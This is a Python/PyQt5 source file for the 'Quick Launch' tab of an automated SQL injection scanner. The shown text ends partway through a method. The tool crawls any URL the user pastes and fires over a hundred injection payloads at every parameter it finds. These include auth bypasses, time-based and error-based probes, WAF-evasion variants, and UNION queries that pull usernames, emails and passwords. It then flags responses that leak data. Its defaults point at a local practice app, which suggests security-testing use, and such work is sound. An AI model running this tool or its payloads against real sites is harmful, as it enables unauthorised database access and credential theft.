
# quick_launch.py - Quick Launch Tab
# Fully automatic. User pastes a URL and clicks Launch.
# The tool crawls the site, finds every endpoint and parameter, then fires payloads against all of them automatically.
# Basic: 20 fast universal payloads, done in under a minute
# Advanced: 150+ payloads across 10 categories, deep coverage

import time
import requests
from datetime import datetime
from urllib.parse import urlparse

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QTextEdit, QTableWidget, QTableWidgetItem,
    QFrame, QHeaderView, QAbstractItemView,
    QCheckBox, QSpinBox, QSplitter, QFileDialog, QProgressBar,
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QColor

# Dark palette
C_CARD    = "#212D42"
C_CONTENT = "#1A2235"
C_SIDEBAR = "#141C2B"
C_INPUT   = "#1E2A3C"
C_HOVER   = "#263347"
C_BORDER  = "#2A3A52"
C_TEXT    = "#E2E8F0"
C_MUTED   = "#94A3B8"
C_DIMMED  = "#64748B"
C_ACCENT  = "#4C8EF7"
C_ACCENT_L= "#1E3A6E"
C_SUCCESS = "#34D399"
C_DANGER  = "#F87171"
C_WARNING = "#FBBF24"
C_CODE    = "#0A1120"


# Payload sets

BASIC_PAYLOADS = [
    {"payload": "'",                                                     "label": "Single quote — syntax break",         "tags": "error"},
    {"payload": "\"",                                                    "label": "Double quote — syntax break",         "tags": "error"},
    {"payload": "' OR '1'='1",                                          "label": "Classic auth bypass",                 "tags": "auth"},
    {"payload": "' OR 1=1--",                                           "label": "Always-true + comment",               "tags": "auth"},
    {"payload": "admin'--",                                             "label": "Admin login bypass",                  "tags": "auth"},
    {"payload": "' OR ''='",                                            "label": "Empty string bypass",                 "tags": "auth"},
    {"payload": "' AND 1=1--",                                          "label": "Boolean true probe",                  "tags": "boolean"},
    {"payload": "' AND 1=2--",                                          "label": "Boolean false probe",                 "tags": "boolean"},
    {"payload": "1 OR 1=1",                                             "label": "Numeric context bypass",              "tags": "boolean"},
    {"payload": "'OR'+1+\"OR\"+1=0",                                    "label": "Polyglot — all quote contexts",       "tags": "polyglot"},
    {"payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/", "label": "Polyglot time-based",                 "tags": "time"},
    {"payload": "'; SLEEP(5)--",                                        "label": "MySQL SLEEP delay",                   "tags": "time"},
    {"payload": "'; WAITFOR DELAY '0:0:5'--",                           "label": "MSSQL WAITFOR delay",                 "tags": "time"},
    {"payload": "'; SELECT pg_sleep(5)--",                              "label": "PostgreSQL sleep",                    "tags": "time"},
    {"payload": "' AND RANDOMBLOB(200000000)--",                        "label": "SQLite compute delay",                "tags": "time"},
    {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",       "label": "MySQL error — leaks version",         "tags": "error"},
    {"payload": "' AND 1=CONVERT(int,'a')--",                           "label": "MSSQL type-cast error",               "tags": "error"},
    {"payload": "' UNION SELECT NULL--",                                "label": "Union 1-column probe",                "tags": "union"},
    {"payload": "' UNION SELECT NULL,NULL--",                           "label": "Union 2-column probe",                "tags": "union"},
    {"payload": "' UNION SELECT sqlite_version(),NULL--",               "label": "SQLite version extraction",           "tags": "union"},
]

ADVANCED_GROUPS = {
    "Polyglot Detection": {
        "on": True,
        "payloads": [
            ("SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/", "Karlsson polyglot"),
            ("'OR'+1+\"OR\"+1=0",                                    "nastystereo polyglot"),
            ("'/**/OR/**/1=1--",                                     "Comment-injected OR"),
            ("' OR 1-- -",                                           "Trailing space variant"),
            ("1'1",                                                  "Minimal string breakout"),
            ("\\",                                                   "Backslash escape"),
            ("%27 OR 1=1--",                                         "URL-encoded quote"),
            (";--",                                                  "Statement terminator"),
        ],
    },
    "Auth Bypass": {
        "on": True,
        "payloads": [
            ("' OR '1'='1",      "Always-true string"),
            ("' OR 1=1--",       "Always-true numeric"),
            ("' OR 1=1#",        "MySQL hash comment"),
            ("admin'--",         "Admin bypass"),
            ("') OR ('1'='1",    "Parenthesis-wrapped"),
            ("\" OR \"\"=\"",    "Double-quote bypass"),
            ("' OR ''='",        "Empty string equality"),
            ("' OR TRUE--",      "Boolean TRUE keyword"),
            ("') OR 1=1--",      "Closing paren bypass"),
            ("' OR 1=1 LIMIT 1--", "With LIMIT clause"),
        ],
    },
    "Error Extraction": {
        "on": True,
        "payloads": [
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",            "MySQL: version via EXTRACTVALUE"),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",  "MySQL: current DB name"),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",      "MySQL: current user"),
            ("' OR UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",              "MySQL: UPDATEXML error"),
            ("' AND 1=CONVERT(int,@@VERSION)--",                          "MSSQL: version cast"),
            ("' AND 1=CONVERT(int,DB_NAME())--",                          "MSSQL: DB name"),
            ("' AND 1=CAST(version() AS int)--",                          "PostgreSQL: version cast"),
            ("' HAVING 1=1--",                                            "Any DB: HAVING error"),
            ("'; SELECT 1/0--",                                           "Division by zero"),
        ],
    },
    "Boolean Blind": {
        "on": True,
        "payloads": [
            ("' AND 1=1--",     "True probe"),
            ("' AND 1=2--",     "False probe"),
            ("' AND 'a'='a'--", "String true"),
            ("' AND 'a'='b'--", "String false"),
            ("') AND (1=1)--",  "Paren-wrapped true"),
            ("') AND (1=2)--",  "Paren-wrapped false"),
            ("1 AND 1=1",       "Numeric true"),
            ("1 AND 1=2",       "Numeric false"),
            ("' AND LENGTH(database())>0--",  "MySQL DB exists"),
            ("' AND (SELECT 1 FROM sqlite_master LIMIT 1)=1--", "SQLite exists"),
        ],
    },
    "Time-Based — All Engines": {
        "on": True,
        "payloads": [
            ("'; SLEEP(5)--",                              "MySQL stacked SLEEP"),
            ("' OR SLEEP(5)--",                            "MySQL OR SLEEP"),
            ("' AND IF(1=1,SLEEP(5),0)--",                 "MySQL conditional"),
            ("'; WAITFOR DELAY '0:0:5'--",                 "MSSQL WAITFOR"),
            ("'; IF 1=1 WAITFOR DELAY '0:0:5'--",          "MSSQL conditional"),
            ("'; SELECT pg_sleep(5)--",                    "PostgreSQL sleep"),
            ("' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",      "PostgreSQL subquery"),
            ("' AND RANDOMBLOB(200000000)--",              "SQLite compute delay"),
            ("'; SELECT RANDOMBLOB(500000000)--",          "SQLite larger compute"),
        ],
    },
    "Union Extraction": {
        "on": True,
        "payloads": [
            ("' ORDER BY 1--",   "Col count probe 1"),
            ("' ORDER BY 2--",   "Col count probe 2"),
            ("' ORDER BY 3--",   "Col count probe 3"),
            ("' UNION SELECT NULL--",         "1-col NULL"),
            ("' UNION SELECT NULL,NULL--",    "2-col NULL"),
            ("' UNION SELECT NULL,NULL,NULL--","3-col NULL"),
            ("' UNION SELECT @@version,NULL--",        "MySQL/MSSQL version"),
            ("' UNION SELECT version(),NULL--",         "PostgreSQL version"),
            ("' UNION SELECT sqlite_version(),NULL--",  "SQLite version"),
            ("' UNION SELECT database(),NULL--",        "MySQL DB name"),
            ("' UNION SELECT user(),NULL--",            "MySQL current user"),
            ("' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--", "SQLite tables"),
            ("' UNION SELECT group_concat(name,'|'),NULL FROM sqlite_master WHERE type='table'--", "SQLite all tables"),
            ("' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 5--", "MySQL tables"),
            ("' UNION SELECT username,password FROM users LIMIT 5--",  "Generic: users table"),
            ("' UNION SELECT email,password FROM users LIMIT 5--",     "Generic: email/password"),
            ("' UNION SELECT group_concat(email||':'||password,'|'),NULL FROM Users--", "Juice Shop credentials"),
        ],
    },
    "WAF Evasion": {
        "on": False,
        "payloads": [
            ("'/**/OR/**/1=1--",   "Comment in OR"),
            ("' UN/**/ION SE/**/LECT NULL,NULL--", "Split UNION SELECT"),
            ("' oR 1=1--",         "Lowercase OR"),
            ("'\tOR\t1=1--",       "Tab whitespace"),
            ("%27 OR 1=1--",       "URL-encoded quote"),
            ("%2527 OR 1=1--",     "Double URL-encoded"),
            ("%00' OR 1=1--",      "Null byte prefix"),
        ],
    },
    "Deep DB Recon": {
        "on": False,
        "payloads": [
            ("' UNION SELECT @@datadir,NULL--",  "MySQL data directory"),
            ("' UNION SELECT @@hostname,NULL--", "MySQL hostname"),
            ("' UNION SELECT GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata--", "MySQL: all databases"),
            ("' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--", "MySQL: all tables"),
            ("' UNION SELECT group_concat(sql),NULL FROM sqlite_master--", "SQLite: full schema"),
            ("' UNION SELECT name,NULL FROM master..sysdatabases--", "MSSQL: all databases"),
            ("' UNION SELECT datname,NULL FROM pg_database--", "PostgreSQL: all databases"),
        ],
    },
    "Stacked Queries": {
        "on": False,
        "payloads": [
            ("1; SELECT 1--",          "Stacked query test"),
            ("1'; SELECT SLEEP(5)--",  "Stacked with delay"),
            ("'; SELECT @@version--",  "Stacked version read"),
        ],
    },
    "JSON / Header Injection": {
        "on": False,
        "payloads": [
            ('{"email":"admin\'--","password":"x"}',         "JSON admin bypass"),
            ('{"email":"a\' OR \'1\'=\'1","password":"x"}',  "JSON always-true"),
            ("' OR '1'='1",                                  "Header: basic bypass"),
            ("1' AND SLEEP(5)--",                            "Header: time-based"),
            ("999 &#x53;ELECT * FROM information_schema.tables", "XML entity bypass"),
        ],
    },
}

ERROR_SIGNATURES = [
    "sqlite", "sql syntax", "mysql_fetch", "mysql error",
    "warning: mysql", "pg_query", "unterminated quoted",
    "near \"", "syntax error", "ora-01", "ora-00",
    "sqlstate", "sqlexception", "odbc driver",
    "microsoft sql server", "db2 sql error",
    "invalid input syntax", "you have an error in your sql",
    "division by zero", "conversion failed",
    "sequelizedatabaseerror", "sqlite_error",
]


# ─────────────────────────────────────────────────────────────────────────────
# Worker thread — crawls then tests automatically
# ─────────────────────────────────────────────────────────────────────────────

class AutoScanWorker(QThread):
    log_signal      = pyqtSignal(str, str)
    result_signal   = pyqtSignal(dict)
    progress_signal = pyqtSignal(int, int, str)
    done_signal     = pyqtSignal(list)

    def __init__(self, config: dict, payloads: list):
        super().__init__()
        self.config   = config
        self.payloads = payloads
        self._stop    = False

    def stop(self): self._stop = True

    def log(self, msg, level="info"):
        self.log_signal.emit(msg, level)

    def run(self):
        try:
            self._run()
        except Exception as e:
            self.log(f"Scan error: {e}", "error")
            self.done_signal.emit([])

    def _run(self):
        from crawler import Crawler

        url     = self.config["url"]
        timeout = self.config.get("timeout", 10)
        delay   = self.config.get("delay", 0)

        session = requests.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0 SQLiScout/QuickLaunch"})

        # Phase 1: Discovery
        self.log(f"Crawling {url} ...", "info")
        self.progress_signal.emit(0, 1, "Discovering endpoints...")

        class _Reporter:
            def info(self, m): pass
            def success(self, m): pass
            def warning(self, m): pass
            def error(self, m): pass
            def verbose(self, m): pass
            def section(self, m): pass

        crawler_config = {
            "target":      url,
            "crawl_depth": self.config.get("crawl_depth", 2),
            "timeout":     timeout,
            "delay":       0,
            "verbose":     False,
        }

        crawler   = Crawler(crawler_config, session, _Reporter())
        endpoints = crawler.crawl()

        if not endpoints:
            self.log("No endpoints found. Check the URL is reachable and try a lower crawl depth.", "warning")
            self.done_signal.emit([])
            return

        # Build (endpoint, param) test pairs
        targets = []
        for ep in endpoints:
            params = list((ep.get("params") or {}).keys())
            data   = list((ep.get("data")   or {}).keys())
            fields = params + data
            if not fields:
                fields = ["q", "id", "search", "email", "username", "name", "query"]
            for param in fields:
                targets.append((ep, param))

        self.log(f"Found {len(endpoints)} endpoint(s), {len(targets)} parameter(s) to test", "success")

        # Phase 2: Baseline
        self.log("Measuring baseline latency...", "info")
        baselines = {}
        for ep, _ in targets[:6]:
            key = ep["url"]
            if key not in baselines:
                try:
                    t0 = time.perf_counter()
                    session.get(ep["url"], params={"_b": "1"}, timeout=timeout)
                    baselines[key] = time.perf_counter() - t0
                except Exception:
                    baselines[key] = 1.0

        time_flag = self.config.get("time_flag", 4)
        total     = len(targets) * len(self.payloads)
        current   = 0
        results   = []

        self.log(f"Testing {len(self.payloads)} payload(s) x {len(targets)} target(s)...", "info")

        for ep, param in targets:
            if self._stop:
                break

            ep_url   = ep["url"]
            method   = ep.get("method", "GET")
            ep_type  = ep.get("type", "")
            baseline = baselines.get(ep_url, 1.0)

            for job in self.payloads:
                if self._stop:
                    break

                current += 1
                payload = job["payload"]
                parsed  = urlparse(ep_url)
                short   = parsed.path.rstrip("/").split("/")[-1] or parsed.netloc

                self.progress_signal.emit(current, total, f"Testing {param} on .../{short}")

                result = {
                    "endpoint": ep_url,
                    "method":   method,
                    "param":    param,
                    "payload":  payload,
                    "label":    job.get("label", ""),
                    "tags":     job.get("tags", ""),
                    "flagged":  False,
                    "flags":    [],
                    "status":   None,
                    "length":   0,
                    "time":     0,
                    "snippet":  "",
                    "extracted": {},
                }

                t_start = time.perf_counter()
                try:
                    params_d = dict(ep.get("params") or {})
                    data_d   = dict(ep.get("data")   or {})

                    if param in params_d:
                        params_d[param] = payload
                    elif param in data_d:
                        data_d[param] = payload
                    else:
                        if method == "GET":
                            params_d[param] = payload
                        else:
                            data_d[param] = payload

                    if method == "GET":
                        resp = session.get(ep_url, params=params_d, timeout=timeout)
                    elif ep_type == "api_json":
                        data_d[param] = payload
                        resp = session.post(ep_url, json=data_d, timeout=timeout)
                    else:
                        resp = session.post(ep_url, data=data_d, timeout=timeout)

                    elapsed  = time.perf_counter() - t_start
                    body_low = resp.text.lower()

                    result["status"]  = resp.status_code
                    result["length"]  = len(resp.text)
                    result["time"]    = round(elapsed, 3)
                    result["snippet"] = resp.text[:500]

                    hit = next((s for s in ERROR_SIGNATURES if s in body_low), None)
                    if hit:
                        result["flagged"] = True
                        result["flags"].append(f"Error: {hit}")

                    # Try to extract DB version, user, or table names if present in response
                    # (very basic regex, can be improved)
                    import re
                    version_match = re.search(r"(mysql|postgres|sqlite|mariadb|oracle)[^\n\r<]{0,40}version[^\n\r<]{0,40}?([\d\.]+)", body_low)
                    if version_match:
                        result["extracted"]["db_version"] = version_match.group(0)
                        result["flagged"] = True
                        result["flags"].append(f"Extracted DB version: {version_match.group(0)}")
                    user_match = re.search(r"current_user\W*[:=]?\W*([\w@.\-]+)", body_low)
                    if user_match:
                        result["extracted"]["db_user"] = user_match.group(1)
                        result["flagged"] = True
                        result["flags"].append(f"Extracted DB user: {user_match.group(1)}")
                    table_match = re.search(r"table[_ ]name\W*[:=]?\W*([\w\-]+)", body_low)
                    if table_match:
                        result["extracted"]["table_name"] = table_match.group(1)
                        result["flagged"] = True
                        result["flags"].append(f"Extracted table: {table_match.group(1)}")

                    if elapsed >= time_flag and elapsed > baseline + 2.5:
                        result["flagged"] = True
                        result["flags"].append(f"Delay {elapsed:.1f}s (baseline {baseline:.1f}s)")

                    if resp.status_code == 500:
                        result["flagged"] = True
                        result["flags"].append("HTTP 500")

                except requests.exceptions.Timeout:
                    result["status"]  = "TIMEOUT"
                    result["time"]    = round(time.perf_counter() - t_start, 3)
                    result["flagged"] = True
                    result["flags"].append("Timeout — possible time-based injection")

                except Exception as e:
                    result["status"] = "ERROR"
                    result["flags"].append(str(e)[:60])

                results.append(result)
                if result["flagged"]:
                    self.result_signal.emit(result)

                if delay:
                    time.sleep(delay)

        self.done_signal.emit(results)


# ─────────────────────────────────────────────────────────────────────────────
# Quick Launch Tab
# ─────────────────────────────────────────────────────────────────────────────

class QuickLaunchTab(QWidget):
    def _opt_row(self, layout, label, default, minval, maxval):
        """
        Helper to add a labeled QSpinBox row to the given layout.
        Returns the QSpinBox instance for value access.
        """
        row = QHBoxLayout()
        row.setSpacing(8)
        lbl = QLabel(label)
        lbl.setStyleSheet(f"font-size: 12px; color: {C_TEXT}; background: transparent;")
        row.addWidget(lbl)
        spin = QSpinBox()
        spin.setMinimum(minval)
        spin.setMaximum(maxval)
        spin.setValue(default)
        spin.setStyleSheet(f"""
            QSpinBox {{
                background: {C_INPUT}; border: 1px solid {C_BORDER};
                border-radius: 7px; padding: 6px 10px;
                color: {C_TEXT}; font-size: 13px;
                width: 70px;
            }}
            QSpinBox:focus {{ border-color: {C_ACCENT}; }}
        """)
        row.addWidget(spin)
        row.addStretch()
        layout.addLayout(row)
        return spin
    def __init__(self):
        super().__init__()
        self._worker  = None
        self._results = []
        self._mode    = "basic"
        self._build_ui()

    def _build_ui(self):
        self.setStyleSheet(f"background: {C_CONTENT}; color: {C_TEXT};")
        root = QHBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        splitter = QSplitter(Qt.Horizontal)
        splitter.setHandleWidth(1)
        splitter.setStyleSheet(f"QSplitter::handle {{ background: {C_BORDER}; }}")
        splitter.addWidget(self._build_left())
        splitter.addWidget(self._build_right())
        splitter.setSizes([300, 1000])
        root.addWidget(splitter)

    # ── Left panel ────────────────────────────────────────────────────────────

    def _build_left(self) -> QWidget:
        from PyQt5.QtWidgets import QScrollArea

        # Outer wrapper — fixed width, dark bg, clip
        outer = QWidget()
        outer.setStyleSheet(f"background: {C_SIDEBAR}; border-right: 1px solid {C_BORDER};")
        outer.setFixedWidth(310)
        outer_lay = QVBoxLayout(outer)
        outer_lay.setContentsMargins(0, 0, 0, 0)
        outer_lay.setSpacing(0)

        # Scrollable inner panel — all content lives here
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll.setStyleSheet(f"""
            QScrollArea {{ background: {C_SIDEBAR}; border: none; }}
            QScrollArea > QWidget > QWidget {{ background: {C_SIDEBAR}; }}
            QScrollBar:vertical {{
                background: {C_HOVER}; width: 6px; border-radius: 3px; margin: 0;
            }}
            QScrollBar::handle:vertical {{
                background: {C_BORDER}; border-radius: 3px; min-height: 24px;
            }}
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
        """)

        inner = QWidget()
        inner.setStyleSheet(f"background: {C_SIDEBAR};")
        lay = QVBoxLayout(inner)
        lay.setContentsMargins(16, 18, 16, 16)
        lay.setSpacing(14)

        # ── Target URL ────────────────────────────────────────────────────────
        url_lbl = QLabel("TARGET URL")
        url_lbl.setStyleSheet(f"font-size: 10px; font-weight: 700; color: {C_DIMMED}; letter-spacing: 1.2px; background: transparent;")
        lay.addWidget(url_lbl)

        self.url_input = QLineEdit("http://localhost:3000")
        self.url_input.setPlaceholderText("http://example.com")
        self.url_input.setStyleSheet(f"""
            QLineEdit {{
                background: {C_INPUT}; border: 1px solid {C_BORDER};
                border-radius: 7px; padding: 10px 12px;
                color: {C_TEXT}; font-size: 13px;
            }}
            QLineEdit:focus {{ border-color: {C_ACCENT}; }}
        """)
        lay.addWidget(self.url_input)

        hint = QLabel("Paste any URL — the tool finds endpoints automatically.")
        hint.setStyleSheet(f"font-size: 10px; color: {C_DIMMED}; background: transparent;")
        hint.setWordWrap(True)
        lay.addWidget(hint)

        # ── Divider ───────────────────────────────────────────────────────────
        lay.addWidget(self._divider())

        # ── Scan Mode ─────────────────────────────────────────────────────────
        mode_lbl = QLabel("SCAN MODE")
        mode_lbl.setStyleSheet(f"font-size: 10px; font-weight: 700; color: {C_DIMMED}; letter-spacing: 1.2px; background: transparent;")
        lay.addWidget(mode_lbl)

        mode_row = QHBoxLayout()
        mode_row.setSpacing(8)
        self.basic_btn    = self._mode_btn("Basic",    True)
        self.advanced_btn = self._mode_btn("Advanced", False)
        self.basic_btn.clicked.connect(lambda: self._set_mode("basic"))
        self.advanced_btn.clicked.connect(lambda: self._set_mode("advanced"))
        mode_row.addWidget(self.basic_btn)
        mode_row.addWidget(self.advanced_btn)
        lay.addLayout(mode_row)

        # Mode description card
        self.mode_card = QFrame()
        self.mode_card.setStyleSheet(f"background: {C_CARD}; border: 1px solid {C_BORDER}; border-radius: 8px;")
        mc = QVBoxLayout(self.mode_card)
        mc.setContentsMargins(12, 10, 12, 10)
        mc.setSpacing(4)
        self.mode_title = QLabel("Basic — Quick Probe")
        self.mode_title.setStyleSheet(f"font-size: 12px; font-weight: 700; color: {C_TEXT}; background: transparent;")
        self.mode_desc = QLabel(
            f"{len(BASIC_PAYLOADS)} payloads — error triggers, auth bypass, "
            "boolean probes, polyglot time-based. Completes in under 60 seconds."
        )
        self.mode_desc.setStyleSheet(f"font-size: 11px; color: {C_MUTED}; background: transparent; line-height: 1.5;")
        self.mode_desc.setWordWrap(True)
        mc.addWidget(self.mode_title)
        mc.addWidget(self.mode_desc)
        lay.addWidget(self.mode_card)

        # ── Advanced groups (shown only in advanced mode) ─────────────────────
        self.adv_frame = QWidget()
        self.adv_frame.setStyleSheet(f"background: {C_SIDEBAR};")
        af = QVBoxLayout(self.adv_frame)
        af.setContentsMargins(0, 0, 0, 0)
        af.setSpacing(8)

        grp_lbl = QLabel("PAYLOAD GROUPS")
        grp_lbl.setStyleSheet(f"font-size: 10px; font-weight: 700; color: {C_DIMMED}; letter-spacing: 1.2px; background: transparent;")
        af.addWidget(grp_lbl)

        self.group_checks = {}
        for name, data in ADVANCED_GROUPS.items():
            cb = QCheckBox()
            cb.setChecked(data["on"])
            cb.setText(f"  {name}  ({len(data['payloads'])})")
            cb.setStyleSheet(f"""
                QCheckBox {{
                    background: {C_CARD};
                    color: {C_TEXT};
                    font-size: 12px;
                    padding: 7px 10px;
                    border: 1px solid {C_BORDER};
                    border-radius: 6px;
                    spacing: 10px;
                    min-height: 22px;
                }}
                QCheckBox:hover {{
                    border-color: {C_ACCENT};
                    background: {C_HOVER};
                }}
                QCheckBox::indicator {{
                    width: 15px; height: 15px; border-radius: 3px;
                    border: 1.5px solid {C_MUTED};
                    background: {C_INPUT};
                }}
                QCheckBox::indicator:checked {{
                    background: {C_ACCENT};
                    border-color: {C_ACCENT};
                }}
            """)
            af.addWidget(cb)
            self.group_checks[name] = cb

        sel_row = QHBoxLayout()
        sel_row.setSpacing(6)
        for label, val in [("Select All", True), ("Clear All", False)]:
            b = QPushButton(label)
            b.setStyleSheet(self._mini())
            b.clicked.connect(lambda _, v=val: [c.setChecked(v) for c in self.group_checks.values()])
            sel_row.addWidget(b)
        sel_row.addStretch()
        af.addLayout(sel_row)

        lay.addWidget(self.adv_frame)
        self.adv_frame.hide()

        # ── Divider ───────────────────────────────────────────────────────────
        lay.addWidget(self._divider())

        # ── Options ───────────────────────────────────────────────────────────
        opt_lbl = QLabel("OPTIONS")
        opt_lbl.setStyleSheet(f"font-size: 10px; font-weight: 700; color: {C_DIMMED}; letter-spacing: 1.2px; background: transparent;")
        lay.addWidget(opt_lbl)

        self.opt_depth    = self._opt_row(lay, "Crawl Depth",    2,  0, 5)
        self.opt_timeout  = self._opt_row(lay, "Timeout (s)",    10, 3, 60)
        self.opt_timeflag = self._opt_row(lay, "Time Flag (s)",  4,  1, 30)
        self.opt_delay    = self._opt_row(lay, "Delay (s)",      0,  0, 10)

        lay.addStretch()

        scroll.setWidget(inner)
        outer_lay.addWidget(scroll, 1)

        # ── Launch / Stop (pinned to bottom, outside scroll) ──────────────────
        btn_area = QWidget()
        btn_area.setStyleSheet(f"background: {C_SIDEBAR}; border-top: 1px solid {C_BORDER};")
        btn_lay = QVBoxLayout(btn_area)
        btn_lay.setContentsMargins(16, 12, 16, 14)
        btn_lay.setSpacing(8)

        self.launch_btn = QPushButton("Launch Scan")
        self.launch_btn.setStyleSheet(f"""
            QPushButton {{
                background: {C_ACCENT}; color: white; border: none;
                border-radius: 8px; padding: 12px;
                font-size: 14px; font-weight: 700; min-height: 44px;
            }}
            QPushButton:hover {{ background: #6BA3F9; }}
            QPushButton:disabled {{ background: {C_HOVER}; color: {C_DIMMED}; }}
        """)
        self.launch_btn.clicked.connect(self._launch)

        self.stop_btn = QPushButton("Stop Scan")
        self.stop_btn.setStyleSheet(f"""
            QPushButton {{
                background: {C_DANGER}; color: white; border: none;
                border-radius: 8px; padding: 12px;
                font-size: 14px; font-weight: 700; min-height: 44px;
            }}
            QPushButton:hover {{ background: #EF4444; }}
        """)
        self.stop_btn.clicked.connect(self._stop)
        self.stop_btn.hide()

        self.progress = QProgressBar()
        self.progress.setRange(0, 100)
        self.progress.setStyleSheet(f"""
            QProgressBar {{
                background: {C_HOVER}; border: none;
                border-radius: 3px; height: 5px; color: transparent;
            }}
            QProgressBar::chunk {{ background: {C_ACCENT}; border-radius: 3px; }}
        """)
        self.progress.hide()

        btn_lay.addWidget(self.launch_btn)
        btn_lay.addWidget(self.stop_btn)
        btn_lay.addWidget(self.progress)
        outer_lay.addWidget(btn_area)

        return outer

    def _divider(self) -> QFrame:
        d = QFrame()
        d.setFixedHeight(1)
        d.setStyleSheet(f"background: {C_BORDER}; border: none;")
        return d


    def _build_right(self) -> QWidget:
        w = QWidget()
        w.setStyleSheet(f"background: {C_CONTENT};")
        lay = QVBoxLayout(w)
        lay.setContentsMargins(16, 16, 16, 16)
        lay.setSpacing(10)

        # Stat chips
        cr = QHBoxLayout()
        cr.setSpacing(10)
        self.chip_tested   = self._chip("Tests Run",  "—", C_MUTED)
        self.chip_flagged  = self._chip("Findings",   "—", C_DANGER)
        self.chip_endpoints= self._chip("Endpoints",  "—", C_ACCENT)
        self.chip_clean    = self._chip("Clean",       "—", C_SUCCESS)
        for c in [self.chip_tested, self.chip_flagged,
                  self.chip_endpoints, self.chip_clean]:
            cr.addWidget(c)
        cr.addStretch()
        eb = QPushButton("Export CSV")
        eb.setStyleSheet(self._mini())
        eb.clicked.connect(self._export)
        cb2 = QPushButton("Clear")
        cb2.setStyleSheet(self._mini())
        cb2.clicked.connect(self._clear)
        cr.addWidget(eb)
        cr.addWidget(cb2)
        lay.addLayout(cr)

        self.status_lbl = QLabel("Paste a URL on the left and click Launch Scan.")
        self.status_lbl.setStyleSheet(f"font-size: 12px; color: {C_MUTED}; background: transparent;")
        lay.addWidget(self.status_lbl)

        # Live log
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setMaximumHeight(100)
        self.log_box.setStyleSheet(f"""
            QTextEdit {{
                background: {C_CODE}; color: {C_MUTED};
                border: 1px solid {C_BORDER}; border-radius: 7px;
                padding: 8px 10px;
                font-family: "Cascadia Code", "Consolas", monospace;
                font-size: 11px;
            }}
        """)
        lay.addWidget(self.log_box)

        # Findings header
        fh = QHBoxLayout()
        ft = QLabel("Findings  —  only flagged results shown")
        ft.setStyleSheet(f"font-size: 12px; font-weight: 700; color: {C_TEXT}; background: transparent;")
        self.flagged_badge = QLabel("")
        self.flagged_badge.setStyleSheet(f"font-size: 12px; font-weight: 700; color: {C_DANGER}; background: transparent;")
        fh.addWidget(ft)
        fh.addSpacing(10)
        fh.addWidget(self.flagged_badge)
        fh.addStretch()
        lay.addLayout(fh)

        self.table = QTableWidget()
        self.table.setColumnCount(7)
        self.table.setHorizontalHeaderLabels(
            ["Endpoint", "Parameter", "Payload", "Type", "Status", "Time", "Finding"]
        )
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self.table.horizontalHeader().setSectionResizeMode(6, QHeaderView.Stretch)
        self.table.setColumnWidth(1, 95)
        self.table.setColumnWidth(3, 85)
        self.table.setColumnWidth(4, 60)
        self.table.setColumnWidth(5, 65)
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.verticalHeader().setVisible(False)
        self.table.setShowGrid(False)
        self.table.setAlternatingRowColors(True)
        self.table.setStyleSheet(f"""
            QTableWidget {{
                background: {C_CARD}; border: 1px solid {C_BORDER};
                border-radius: 8px; color: {C_TEXT};
                alternate-background-color: {C_CONTENT}; outline: none;
            }}
            QTableWidget::item {{ padding: 7px 10px; border: none; }}
            QTableWidget::item:selected {{ background: {C_ACCENT_L}; color: {C_TEXT}; }}
            QHeaderView::section {{
                background: {C_SIDEBAR}; color: {C_DIMMED};
                font-size: 10px; font-weight: 700;
                text-transform: uppercase; letter-spacing: 0.6px;
                padding: 8px 10px; border: none;
                border-bottom: 1px solid {C_BORDER};
                border-right: 1px solid {C_BORDER};
            }}
        """)
        self.table.itemSelectionChanged.connect(self._on_row_selected)
        lay.addWidget(self.table)

        pl = QLabel("Response Preview")
        pl.setStyleSheet(f"font-size: 11px; font-weight: 600; color: {C_DIMMED}; background: transparent;")
        lay.addWidget(pl)

        self.preview = QTextEdit()
        self.preview.setReadOnly(True)
        self.preview.setMaximumHeight(100)
        self.preview.setStyleSheet(f"""
            QTextEdit {{
                background: {C_CODE}; color: {C_MUTED};
                border: 1px solid {C_BORDER}; border-radius: 7px;
                padding: 10px;
                font-family: "Cascadia Code", "Consolas", monospace;
                font-size: 11px;
            }}
        """)
        lay.addWidget(self.preview)
        return w

    # ─────────────────────────────────────────────────────────────────────────
    # Mode
    # ─────────────────────────────────────────────────────────────────────────

    def _set_mode(self, mode: str):
        self._mode = mode
        active   = f"QPushButton {{ background: {C_ACCENT}; color: white; border: none; border-radius: 7px; padding: 8px 14px; font-size: 13px; font-weight: 700; }}"
        inactive = f"QPushButton {{ background: {C_CARD}; color: {C_MUTED}; border: 1px solid {C_BORDER}; border-radius: 7px; padding: 8px 14px; font-size: 13px; }} QPushButton:hover {{ border-color: {C_ACCENT}; color: {C_TEXT}; }}"

        if mode == "advanced":
            self.advanced_btn.setStyleSheet(active)
            self.basic_btn.setStyleSheet(inactive)
            self.adv_frame.show()
